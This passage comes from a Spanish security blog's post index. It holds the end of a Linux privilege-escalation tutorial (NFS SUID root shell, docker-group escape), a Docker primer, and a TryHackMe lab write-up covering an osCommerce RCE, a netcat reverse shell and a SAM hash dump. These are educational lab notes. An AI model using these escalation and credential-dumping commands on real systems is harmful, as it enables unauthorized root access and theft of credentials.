mismo recurso compartido en nuestro servidor local, para ello podemos ejecutar la siguiente secuencia de comandos:mkdir /mnt/nfs_mountmount -o rw,vers=2 -l nfs &amp;lt;ip&amp;gt;:&amp;lt;share-resource&amp;gt; /mnt/nfs_mountLuego de realizar la montura, podemos proseguir con la siguiente secuencia de comandos, que nos permitirá crear y compilar un binario SUID que al ser ejecutado por el usuario de sistema le entregue una shell de bash con el usuario root:cd /mnt/nfs_mount/echo &#39;int main(){ setuid(0); system(&quot;/bin/bash&quot;); return 0; }&#39; &amp;gt; privesc.cgcc privesc.c -o privescchmod 4755 privescLuego de realizar esto, volvemos al usuarios de bajos privilegios en el servidor y ejecutamos el binario que hemos añadido al recurso compartido:./privescUna vez hecho esto, seremos root y habremos escalado privilegios en el servidor.Privilege Escalation via Docker GroupSi el usuario de tu sesión actual se encuentra en el grupo docker tienes una vía de escalación de privilegios en el servidor.Para ello debes ejecutar la siguiente secuencia de comandos:# Server Session:# Con este comando podrás ver si tu usuario está en el grupo &quot;docker&quot;.$ id# Con este comando obtendrás las imagenes de Docker# que están instaladas en el servidor.$ docker images# Con este comando lo que harás será:# 1. Arrancar un contenedor a partir de una imagen instalada en el host.# 2. Montar la raíz del servidor padre dentro del directorio /mnt del contenedor. # De esta manera todos los cambios que se apliquen dentro del directorio # /mnt, del contenedor, serán realizados en el servidor padre.$ docker run -v /:/mnt -it &amp;lt;name&amp;gt;:&amp;lt;tag&amp;gt; /bin/bash# Container session:# Se le asignan privilegios SUID a la bash del servidor padre# montada en el contenedor.$ chmod 4755 /mnt/bin/bash$ exit# Server session:# Una vez salimos del contenedor nuestra /bin/bash tendrá privielgios# SUID, por lo que será cuestión de ejecutar el siguiente comando para# escalar privilegios:$ /bin/bash -pDe manera alternativa puedes utilizar el GTFOBins: https://gtfobins.github.io/gtfobins/docker/Si estás interesado en la temática de contenedores, puedes mirarte este post que escribí hace un tiempo sobre Docker.Muchas gracias por haber leído el post, espero que el contenido haya sido útil, cualquier cosa puedes contactarme por mis redes sociales! 💪Happy Hacking!" }, { "title": "Docker - Cómo ser un pro siendo noob 💣", "url": "/posts/docker-como-ser-un-pro-siendo-noob/", "categories": "Docker", "tags": "docker, guide", "date": "2021-12-13 17:30:00 -0300", "snippet": "Docker nos sirve principamente para encapsular aplicaciones con sus respectivas dependencias. Lo cual significa que, estas pueden correr en cualquier máquina.Esto a su vez permite que una app se puede exportar de PC a PC sin problemas de compatibilidad.Con Docker basicamente encapsulamos a una aplicación en un entorno dedicado para sí, hecho completamente a su medida para correr.Como Docker nos permite aislar entornos, significa que podemos tener multiples aplicaciones en un mismo servidor con distintas dependencias y diferentes versiones de estas.Antiguamente se utilizaban máquinas virtuales para aislar entornos, lo que hoy en día es algo nefasto e ineficiente (¿Por qué? básicamente porque es un execesivo e innecesario consumo recursos).Máquinas Virtuales VS Contenedores 💕Máquinas Virtuales Es un sistema operativo dentro de otro que posee un hardware basado en el del sistema operativo nativo. Su peso es mucho mayor que el de un contenedor. Ocupan una gran porción del disco duro. Su configuración e instalación es mucho más lenta. Es relativamente más seguro, pero mucho menos eficiente.Contenedores Son virtualizaciones o instancias de un sistema operativo, que no contemplan al hardware en ningún aspecto. Son mucho más ligeros y no ocupan mucho espacio en el disco. Su instalación es practicamente instantánea. Son mucho más eficientes a diferencia de las máquinas virtuales.Docker Image 💿 Es una plantilla que contendrá las instrucciones para armar al contenedor. De cierta forma, es similar a un instalador. Puede contener todos, o casi todos, los elementos necesarios para montar una app contenerizada (esto dependerá de las necesidades del software). Puede ser compartida para que otros desarrolladores las ocupen. Estas imagenes son creadas usando Dockerfile (para entenderlo de una: son las instrucciones para armar cada contenedor).Contenedor 📦 Un contenedor es una instancia de una imagen ya instalada y arrancada. Poseen un rendimiento similar al del sistema operativo nativo (por lo que no perjudican a la aplicación como tal). Pueden haber multiples de estos en un solo servidor. Cada contenedor es un proceso.Docker Hub 🌎Es un repositorio centralizado de Docker donde se comparten diferentes imágenes que nos pueden ser utilles de acuerdo a los proyectos que estemos llevando a cabo.Sitio de Docker Hub: Docker HubGlosario necesario 📌 ID: cada imagen y contenedor tienen uno. Tag: es el nombre de una imagen. Esta puede contener dos puntos (:) para señalar la verisón de la misma, por ejemplo ubuntu, ubuntu:latest o ubuntu:18.04.Comandos básicos 👀⚡Instalación y arranque de un contenedor:$ docker run &amp;lt;image/tag&amp;gt;Listar las imagenes instaladas en el servidor:$ docker imagesBuscar una imagen de Docker Hub por terminal:$ docker search &amp;lt;image/tag&amp;gt;Descargar una imagen:$ docker pull &amp;lt;image/tag&amp;gt;Ejecutar un comando en el contenedor:$ docker run &amp;lt;tag&amp;gt; &amp;lt;command&amp;gt;Ejecutar un inteprete bash, o sh, de forma interactiva en el contenedor:$ docker run -it &amp;lt;tag&amp;gt; bash $ docker run -it &amp;lt;tag&amp;gt; sh Listar los contenedores que estén corriendo en el servidor:$ docker ps$ docker ps -a (muestra el historial de los contendores que estuvieron corriendo)Eliminar un contendor:$ docker rm &amp;lt;container-id/name&amp;gt;Arrancar un contenedor nuevamente:$ docker start &amp;lt;container-id&amp;gt; (este puede estar detenido pero ser visualizado con docker ps -a)Detener un contenedor corriendo:$ docker stop &amp;lt;container-id&amp;gt;Visualizar un puerto interno del contenedor en uno de nuestro servidor local (tunelizamos su salida):$ docker run -p &amp;lt;local-port&amp;gt;:&amp;lt;container-port&amp;gt; &amp;lt;tag&amp;gt;Visualizar un puerto interno del contenedor en varios puertos de nuestro servidor local (tunelizamos las salida):$ docker run -p &amp;lt;local-port&amp;gt;:&amp;lt;container-port&amp;gt; -p &amp;lt;local-port&amp;gt;:&amp;lt;container-port&amp;gt; -p &amp;lt;local-port&amp;gt;:&amp;lt;container-port&amp;gt; &amp;lt;tag&amp;gt;Arrancar un contenedor en segundo plano (Detached Mode / Modo Independiente):$ docker run -p &amp;lt;local-port&amp;gt;:&amp;lt;container-port&amp;gt; -d &amp;lt;tag&amp;gt;Listar los IDs de todos los contendores:$ docker ps -q$ docker ps -aq (considera a los contenedores que hace poco fueron detenidos)Asignar un nombre a contenedor al arrancarlo:$ docker run --name &amp;lt;container-name&amp;gt; &amp;lt;tag&amp;gt;Forzar opciones de Docker:$ docker rm -f &amp;lt;container-id&amp;gt; (forzamos la eliminación de un contenedor)$ docker rmi -f &amp;lt;image&amp;gt; (forzamos la eliminación de una imagen)Establecer variables de entorno en el contenedor:$ docker run -e &amp;lt;env-variable&amp;gt; &amp;lt;tag&amp;gt;Establecer un formato de salida al listado de contenedores:$ docker ps -a --format=&quot;format&quot;$ docker ps --format=&quot;format&quot;$ docker ps -a --format=&quot;\\n[*] ID: \\n[*] Name: &quot;Montar un volumen del servidor local en el contenedor:$ docker run -v &amp;lt;local-dir&amp;gt;:&amp;lt;container-dir&amp;gt; &amp;lt;tag&amp;gt; Nota: un volumen es basicamente el contenido de un directorio de nuestro servidor. Este contenido se copia en dentro del volumen del contenedor. Esto significa que cualquier cambio que se haga en los volumenes va a ocurrir tanto en el servidor como en el contenedor, lo que genera persistencia de los datos.Exponer un puerto del contenedor en una red de contenedores:$ docker run --expose &amp;lt;port&amp;gt; &amp;lt;tag&amp;gt; Nota: algunas imágenes ya traen habilitada esta opción por defecto aunque, como buena práctica, nunca viene mal señalarlo. Sobre todo si más adelante vamos a llevar nuestro proyecto a un entorno de producción.Ejecutar comandos en un contenedor arrancado:$ docker exec &amp;lt;container-id&amp;gt; &amp;lt;command&amp;gt;Abrir una terminal interactiva en un contenedor arrancado:$ docker exec -it &amp;lt;container-id&amp;gt; bash (nos abre una terminal interactiva con bash en el contenedor arrancado)$ docker exec -it &amp;lt;container-id&amp;gt; sh (nos abre una terminal interactiva con sh en el contenedor arrancado)Dockerfile 📄Como mencioné anteriormente los Dockerfile son las recetas para montar nuestras propias imagenes.##### Contenido común de un Dockerfile: FROM: La imagen o tag que vamos a tomar como base para la nuestra. RUN / CMD / ENTRYPOINT: Los comandos a ejecutar cuando se arranque en el contenedor (puede ser al construirlo o arrancarlo; dependerá meramente de la sentencia que usemos). WORKDIR: Nos permitirá establecer el directorio de trabajo del usuario root en el contenedor. COPY: Nos permitirá copiar cosas de nuestro servidor al contenedor.Dockerfile de ejemploFROM nginx:1.21.24WORKDIR /var/www/htmlCOPY . .RUN npm install -y serialize CMD [&quot;node&quot;, &quot;index.js&quot;] En este caso vemos que se ocupará como base la imagen nginx de versión 1.21.24. Por otro lado, vamos a establecer al directorio /var/www/html como directorio de trabajo dentro del contenedor. También vemos que se copiará todo el contenido de nuestro directorio actual (.), en el directorio de trabajo del contenedor (eso es lo que significa cada punto). Con RUN vamos a correr un comando únicamente cuando construyamos la imagen con docker build. Con CMD vamos a ejecutar un comando cada vez que arranquemos un contenedor con docker run. Aunque no está definido en el Dockerfile, ENTRYPOINT nos va a permitir ejecutar un comando siempre que arranquemos el contenedor; pero dicho comando estará a la espera de un argumento que puede ser un tanto un fichero como un parámetro, entre otras. Esa es su principal diferencia con CMD.Construyendo la imagen 🛠En el directorio donde tengamos el Dockerfile debemos ejecutar lo siguiente para construir nuestra imagen:$ docker build -t &amp;lt;tag&amp;gt; . -t: Nos da la opción de asignarle un nombre, o etiqueta (tag), a nuestra imagen.Subir una imagen a Docker Hub ✔Una vez que tenemos nuestro Dockerfile podemos proceder a crearnos una cuenta en Docker Hub y subir nuestra propia imagen a los repositorios públicos.Pasos Tener un Dockerfile con lo que necesitamos para crear nuestra imagen. Construir la imagen, probarla, y asegurarnos de que todo va correctamente. Tener una cuenta en Docker Hub. Crear una nueva instancia de la imagen pero con un tag diferente siguiendo esta estructura: docker build -t &amp;lt;username&amp;gt;/&amp;lt;tag&amp;gt; . Iniciamos sesión en nuestra cuenta de Docker Hub desde la terminal ejecutando: docker login. Subimos nuestra la instancia de nuestra imagen ejecutando: docker push &amp;lt;username/tag&amp;gt;Creación de tags 🏷Si llegaramos a hacerle cambios a nuestros contenedores podríamos crear tags para almacenarlos en diferentes imágenes. Para crear un tag sólo debemos ejecutar: $ docker tag &amp;lt;image-id&amp;gt;:&amp;lt;version&amp;gt; &amp;lt;name&amp;gt;$ docker tag &amp;lt;image-id&amp;gt;:&amp;lt;version&amp;gt; &amp;lt;username&amp;gt;/&amp;lt;name&amp;gt; (el ID de la imagen y la versión son lo que hacen al tag) Subir el tag a Docker Hub: $ docker login$ docker push &amp;lt;username&amp;gt;/&amp;lt;name&amp;gt;:&amp;lt;version&amp;gt; Redes con Docker 💻⛓Tener esto en cuenta nos permitirá crear una red de contenedores y enlazarlos entre sí los unos con los otros. Crear una red en Docker: $ docker network create &amp;lt;network-name&amp;gt; Listar las redes que tengamos con Docker: $ docker network ls Eliminar una red de Docker: $ docker network rm &amp;lt;network-name&amp;gt; Correr un contenedor en una red Docker: $ docker run --network &amp;lt;network-name&amp;gt; --network-alias &amp;lt;container-name&amp;gt; &amp;lt;tag&amp;gt; Nota: la opción --network-alias nos permitirá asignarle un dominio al contenedor en la red Docker. " }, { "title": "Blueprint - Write up (TryHackMe)", "url": "/posts/Blueprint-TryHackMe/", "categories": "TryHackMe", "tags": "write-up, windows", "date": "2021-10-23 23:40:00 -0300", "snippet": "Este será el primer Write up de mi blog. Partiré suave con una máquina Windows de dificultad fácil en TryHackMe. Su nombre es Blueprint.Para el que desee ver el video en YouTube solo pinche por aquí…TryHackMe y conexiones por VPN Como ya sabrán algunos, para auditar máquinas en TryHackMe debemos conectarnos a una VPN mediante OpenVPN. Esto nos permitirá hacer como si nuestro equipo y el de TryHackMe estuvieran en la misma red. Instalación: VPN de TryHackMeBueno sin más preambulos, comencemos con la máquina…Enumeración de puertosComenzaré haciendo un Port discovery o bien, en Español, un Escaneo de puertos. Para ello haré uso de nmap:nmap -vvv -sS --open -n -Pn -p- --min-rate 5000 10.10.28.212 -oG ports -vvv: verbose con máximo despliegue de información. -sS: indicamos que queremos hacer conexiones por TCP SYN. Esto significa que no se entablarán completamente las conexiones por TCP, esto se hace no completando el Three Way HandShake --open: filtramos por los puertos que se detecten con estado open, o sea que están abiertos (no filtrados, ni cerrados). -n: deshabilitamos la resolución DNS. -Pn: deshabilitamos el host discovery, o descubrimiento de equipos por medio del protocolo ARP. -p-: indicamos que haga escaneo de los 65535 puertos de una máquina. –min-rate: señalamos la cantidad mínima de paquetes a enviar por segundo (en este caso indicamos 5000). -oG: solicitamos que output de la captura se almacene en formato grepeable en el fichero indicado (en mi caso es el archivo ports).Ya con los puertos abiertos en mano, procederé a hacer un escaneo más exhaustivo de de estos:nmap -p80,135,139,443,445,3306,8080,49152,49154,49158,49159 -sV -sC 10.10.28.212 -oN nmap -p: me permite indicarle los puertos a escanear. -sV: detección de servicios y la versión de estos. -sC: me permite utilizar los scripts por defecto que tiene la herramienta nmap para enumerar los servicios que estén corriendo en los puertos. -oN: solicitamos que el output del escaneo se almacene en un fichero en un formato normal (en mi caso lo almaceno en el fichero nmap).Enumeración de servicio SMBComo se puede notar en la captura de nmap, tenemos el puerto 139 y 445 corriendo el servicio SMB. Por esto mismo recurriremos a la herramienta smbclient para enumerar los recursos compartidos que tenga la máquina (aunque también hay otras como crackmapexec o smbmap). Comenzaré listando las comparticiones sin hacer uso de credenciales (null-session):smbclient -L 10.10.28.212 -N -L: solicitamos el listado de recursos compartidos. -N: indicamos el null-sessionComo podemos ver tenemos dos recursos asequibles; aquellos que no tienen el símbolo de dolar ($).Con smbclient probaremos el acceso a ambos recursos y veremos si hay algo interesante por ver:1) Users:Al parecer este es el directorio por defecto de usuarios en el sistema. Al recorrer sus directorios, no di con nada interesante:smbclient //10.10.28.212/Users -N2) Windows:Enumerando de forma rápida este recurso, veo que no permite descargas, ni carga, de ficheros/directorios. Por lo que no nos sirve de mucho.smbclient //10.10.28.212/Windows -NEnumeración de servicios HTTPComo puedo ver en la captura del escaneo de nmap, hay dos puertos corriendo servicios HTTP. Haré una enumeración de ambos con la herrmienta whatweb. Desde el navegador, podríamos utilzar la extensión Wappalyzer. En este caso, con una me basta (lo ideal es probar con más de una si no estás obteniendo resultados de interés):1) Servicio HTTP en el puerto 80:Como se observa hay un Microsoft IIS de versión 7.5 y la página principal en el navegador responde con un código de estado 404.whatweb http://10.10.28.212/Código de estado 404 en el navegador:Buscando algún exploit, para el servicio Microsft IIS 7.5, no di con nada que fuera útil (lo ideal hubiera sido darcon algo que me permitierá hacer algún RCE, File Upload, Path Traversal, etc). Fuentes de busqueda (para exploits): Github, exploit-db y Google2) Servicio HTTP en el puerto 8080:Analizando la captura, lo suyo sería chequear que estos servicios, y tecnologías, no fueran vulnerables (sobre todo si consideramos el hecho de que están desactualizadas).whatweb http://10.10.28.212:8080/Para ahondar más, continue la enumeración mediante el mismo navegador:Como vemos, pareciera ser que el servicio web se integra por directorios y ficheros de una especie de CMS llamado OSCommerce (de versión 2.3.4).Analizando y enterandome de qué es esto, di de forma acertada con que es un tipo de Gestor de contenidos enfocado al comercio electrónico.Ahondando un poco más, encontré con un exploit para la versión 2.3.4 que nos permite hacer ejecución remota de comandos:Explotación y escalación de privilegiosHaciendo ejecución del exploit hice el Remote Command Execution (RCE) y para variar gane acceso al sistema como NT Authority\\System, o sea practicamente como el usuario Administrator con control total del equipo.Pero aquí no termina todo. Por ahora tenemos una shell medianamente interactiva, que corresponde unicamente a un exploit de RCE. Lo ideal sería montarnos una Reverse Shell.Para ello vamos a tratar de meter el binario de netcat al Windows. Por eso, primero debemos tenerlo en nuestra máquina local y abrir un servidor HTTP en el directorio que estése encuentra (en mi caso abro el servicio con Python3):Por otro lado, en la máquina remota hago uso de la utilidad nativa de Windows, Certutil.exe, para descargar el binario de mi servicio HTTP. Es bueno considerar que Certutil.exe no siempre está instalada en todas las máquinas Windows (por más que sea una utilidad nativa). Por lo que es importante tener a mano otras formas de mover archivos de una máquina a otra (no siempre es necesario hacer uso de servicios HTTP).Ya con el netcat descargado, pondré a mi equipo en escucha por el puerto 443:rlwrap nc -nlvp 443 rlwrap es una utilidad que permite añadir historico de comandos, movimiento del cursor, etc., que la shell sea aún más interactiva sin necesidad de complicarse tanto.Ahora desde el Windows, ejecutaré el netcat entablar una conexión y ejecutarme una CMD luego de hacerlo:De esta forma, ya estoy completamente dentro.Si deseamos hacer lectura de la flag (root.txt) usamos el comando type:type C:\\Users\\Administrator\\Desktop\\root.txtVolcando Hashes NTMLEl desafío de TryHackMe nos solicita que obtengamos la contraseña del usuario Lab en texto claro a partir de su hash NTLM desencriptado.Para volcar estos hashes debemos de tener a mano lo que es la SAM y el SYSTEM (bases de datos en formato de registro que almacenan la información requerida para obtener las credenciales de los usuarios). Ojo que la SAM y el SYSTEM sólo se pueden obtener con privilegios del usuario Administrator.Para mover estos binarios yo fui por lo práctico y cree una copia tanto de la SAM como del SYSTEM en el directorios que se compartía mediante el servicio SMB (a los cuales teniamos acceso mediante el null-session).Ambas copias las metí en el directorio: C:\\Users\\Public\\Documents\\C:\\Users\\Public\\Domcuments&amp;gt;reg save HKLM\\SAM .\\SAM.bakC:\\Users\\Public\\Domcuments&amp;gt;reg save HKLM\\SYSTEM .\\SYSTEM.bakAcá podemos ver a SAM.bak y SYSTEM.bak en los recursos compartidos:Luego en mi equipo hice una mountra de tipo cifs con el objetivo de mover más rapidamente la SAM y el SYSTEM a mi sistema:mkdir /mnt/remote_dirmount -t cifs //10.10.28.212/Users /mnt/remote_dirYa con la SAM y el SYSTEM hago uso de la utilidad samdump2 para volcar las credenciales:Como ven debemos extraer la parte que nos interesa del Hash de Lab.Para desencriptarlo podemos tirar de John, Hashcat, etc., pero yo en este caso fui por Crackstation (que hace algo parecido pero desde la web). Este me entrego el valor del hash en texto claro en cosa de segundos:Y pues bueno, el Write up está terminado! Espero haberte sido de ayuda, tengo un canal de YouTube por si quieres estar más atento a las cosas que estoy haciendo, pronto haré alguna que otra pasada por Twitch, etc.¡Hasta la próxima!" } ]
